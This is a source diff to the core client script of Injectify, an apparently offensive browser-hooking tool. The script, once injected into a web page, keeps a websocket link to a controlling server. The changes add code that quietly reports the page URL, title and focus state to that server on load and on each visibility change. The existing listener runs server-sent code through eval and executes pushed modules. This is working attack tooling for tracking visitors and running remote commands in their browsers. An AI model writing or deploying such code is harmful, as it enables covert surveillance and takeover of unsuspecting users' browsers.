@@ -98,7 +98,7 @@ window['injectify'] = class Injectify {
 	 * @param {boolean} local Whether to log it in the local console
 	 */
 	static log(message: any, local?: boolean) {
-		this.send('r', message)
+		this.send('l', message)
 		if (local) console.log(message)
 	}
 	/**
@@ -221,6 +221,32 @@ window['injectify'] = class Injectify {
 		}
 	}
 	/**
+	 * Returns information about the current session, browser etc.
+	 */
+	static get sessionInfo() {
+		/**
+		 * Get the correct document.hidden method
+		 */
+		let hidden = 'hidden'
+		if ('mozHidden' in document) {
+			hidden = 'mozHidden'
+		} else if ('webkitHidden' in document) {
+			hidden = 'webkitHidden'
+		} else if ('msHidden' in document) {
+			hidden = 'msHidden'
+		}
+		/**
+		 * Return object
+		 */
+		return {
+			'window': {
+				'url': window.location.href,
+				'title': document.title ? document.title : window.location.host + window.location.pathname,
+				'focused': !document[hidden],
+			}
+		}
+	}
+	/**
 	 * Returns whether injectify is in debug mode or not
 	 * true  - being used in development
 	 * false - console output should be suppressed
@@ -252,22 +278,33 @@ window['injectify'] = class Injectify {
 	}
 }
 /**
+ * Create local reference to window.injectify
+ */
+let injectify = window['injectify']
+
+/**
  * Set the connect time
  */
-window['injectify'].connectTime = +new Date
+injectify.connectTime = +new Date
 
 /**
  * Debug helpers
  */
-
-if (window['injectify'].debug) {
-	console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', window['injectify'].info)
+if (injectify.debug) {
+	console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info)
 }
+
+/**
+ * Send session info to the Injectify server
+ */
+injectify.send('i', injectify.sessionInfo)
+console.log(injectify.sessionInfo)
+
 
 /**
  * Replace the basic websocket handler with a feature-rich one
  */
-window['injectify'].listener((data, topic) => {
+injectify.listener((data, topic) => {
 	try {
 		if (topic == 'error') {
 			console.error(data)
@@ -296,7 +333,7 @@ window['injectify'].listener((data, topic) => {
 				/**
 				 * If in debug mode display verbose output
 				 */
-				if (window['injectify'].debug) {
+				if (injectify.debug) {
 					console.warn('📦 Executed module "' + module.name + '"', module)
 				}
 
@@ -311,7 +348,7 @@ window['injectify'].listener((data, topic) => {
 				 * Delete it's synchronous callback
 				 */
 				return delete window[data.token]
-			} else if (window['injectify'].debug && data.error.message) {
+			} else if (injectify.debug && data.error.message) {
 				console.error('📦 ' + data.error.message, module)
 			}
 		}
@@ -319,14 +356,42 @@ window['injectify'].listener((data, topic) => {
 			eval(data)
 		}
 	} catch(e) {
-		window['injectify'].error(e.stack)
+		injectify.error(e.stack)
 	}
-})
+});
+
+/**
+ * Page Visibility API
+ */
+(() => {
+	let listener
+
+	let focusChange = () => injectify.send('i', injectify.sessionInfo)
+	
+	/**
+	 * Get the correct hidden listener
+	 */
+	if ('hidden' in document) {
+		listener = 'visibilitychange'
+	} else if ('mozHidden' in document) {
+		listener = 'mozvisibilitychange'
+	} else if ('webkitHidden' in document) {
+		listener = 'webkitvisibilitychange'
+	} else if ('msHidden' in document) {
+		listener = 'msvisibilitychange'
+	} else {
+		window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange
+	}
+	/**
+	 * Add listener
+	 */
+	if (listener) document.addEventListener(listener, focusChange)
+  })()
 
 /**
  * Ping the server every 5 seconds to sustain the connection
  */
 clearInterval(window['ping'])
 window['ping'] = setInterval(() => {
-	window['injectify'].send('heartbeat')
+	injectify.send('heartbeat')
 }, 5000)
